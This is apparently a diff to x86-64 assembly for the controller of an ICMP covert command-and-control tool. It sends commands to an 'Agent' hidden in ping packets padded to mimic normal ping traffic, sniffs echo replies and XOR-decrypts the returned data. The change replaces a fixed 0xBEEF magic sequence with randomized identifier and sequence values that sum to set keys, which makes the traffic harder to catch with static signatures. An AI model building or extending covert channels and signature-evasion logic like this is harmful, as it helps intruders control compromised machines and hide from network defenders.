@@ -20,8 +20,8 @@ section .data
         type db 8               ; ICMP Type 8 (Echo Request)
         code db 0               
         checksum dw 0           ; Checksum placeholder
-        identifier dw 0x1234    ; Packet Identifier
-        sequence db 0xDE, 0xAD  ; Magic Sequence for filtering (0xDEAD)
+        identifier dw 0         ; Packet Identifier
+        sequence dw 0           ; Magic Sequence for filtering
         ; --- MIMICRY PADDING (24 BYTES) ---
         mimicry_ts dq 0         ; 8-byte Dynamic Timestamp (RDTSC)
         mimicry_seq db 0x10, 0x11, 0x12, 0x13, 0x14, 0x15, 0x16, 0x17
@@ -125,7 +125,7 @@ _get_command:
     rdtsc                           ; Read Time-Stamp Counter
     mov [icmp_packet + 8], rax      ; Inject TS right after ICMP Header
     ; -----------------------------------------------------
-
+    call _create_seq_id
     call _checksum_cal      ; Compute ICMP Checksum
     call _sendto            ; Dispatch command to Agent
 
@@ -153,10 +153,23 @@ _sniff:
     cmp byte [sniffed_data + 20], 0     ; Match ICMP Type 0 (Echo Reply)
     jne _sniff                          
 
-    ; --- MAGIC SEQUENCE VERIFICATION ---
-    mov cx, word [sniffed_data + 26]    ; Check Sequence Number (v2.1 logic)
-    cmp cx, 0xEFBE                      ; Match 0xBEEF (Little Endian)
-    jne _sniff                          
+    ;-----------
+    push rax
+    push rdx
+    ;-----------
+; --- MAGIC SEQUENCE VERIFICATION (ASYMMETRIC) ---
+    movzx eax, word [sniffed_data + 26] ; Extract Sequence
+    xchg al, ah                         ; Endianness correction
+    movzx edx, word [sniffed_data + 24] ; Extract Identifier
+    xchg dl, dh                         ; Endianness correction
+    
+    add eax, edx                        ; EAX = SEQ + ID
+    cmp eax, 150                        ; Verify Agent's asymmetric return key (150)
+    
+    pop rdx                             ; Restore saved RDX
+    pop rax                             ; Restore saved RAX (Packet size)
+    
+    jne _sniff                          ; Drop packet if validation fails                   
 
     cmp rax, 0               
     jl _error               
@@ -257,8 +270,20 @@ _sniff_chunk:
     cmp byte [sniffed_data + 20], 0     ; Echo Reply filter
     jne _sniff_chunk                    
 
-    mov cx, word [sniffed_data + 26]    ; Sequence filter
-    cmp cx, 0xEFBE                      
+    push rax
+    push rdx
+; --- MAGIC SEQUENCE VERIFICATION (ASYMMETRIC) ---
+    movzx eax, word [sniffed_data + 26] ; Extract Sequence
+    xchg al, ah                         ; Endianness correction
+    movzx edx, word [sniffed_data + 24] ; Extract Identifier
+    xchg dl, dh                         ; Endianness correction
+    
+    add eax, edx                        ; EAX = SEQ + ID
+    cmp eax, 150                        ; Verify Agent's asymmetric return key (150)
+    
+    pop rdx                             ; Restore saved RDX
+    pop rax                             ; Restore saved RAX (Packet size)
+
     jne _sniff_chunk                    
 
     ; --- EXTRACT & DECRYPT FRAGMENT ---
@@ -354,6 +379,28 @@ _xor_cipher:
 .done:
     ret
 
+_create_seq_id:
+    ; 1. Generate a random number (1-119) for the Identifier
+    rdtsc
+    xor edx, edx    ; Clear EDX before division to prevent hardware exception
+    mov ecx, 119
+    div ecx         ; EDX now contains the remainder (0-118)
+    inc edx         ; EDX is now a random number between 1 and 119 (ID)
+
+    ; 2. Calculate the corresponding Sequence number
+    mov eax, 120    ; Load the master key total (120) into EAX
+    sub eax, edx    ; EAX = 120 - EDX (This becomes the SEQ value)
+
+    ; 3. Network Byte Order (Endianness) Correction
+    ; Convert to Big-Endian as required by network protocols
+    xchg dl, dh     ; Swap lower 16 bits of EDX (DX)
+    xchg al, ah     ; Swap lower 16 bits of EAX (AX)
+
+    ; 4. Inject into the ICMP packet structure
+    ; ID is at offset 4, SEQ is at offset 6 in the ICMP header
+    mov word [icmp_packet + 4], dx
+    mov word [icmp_packet + 6], ax
+    ret
 _error:
     mov rax, 60              ; sys_exit
     mov rdi, 1               
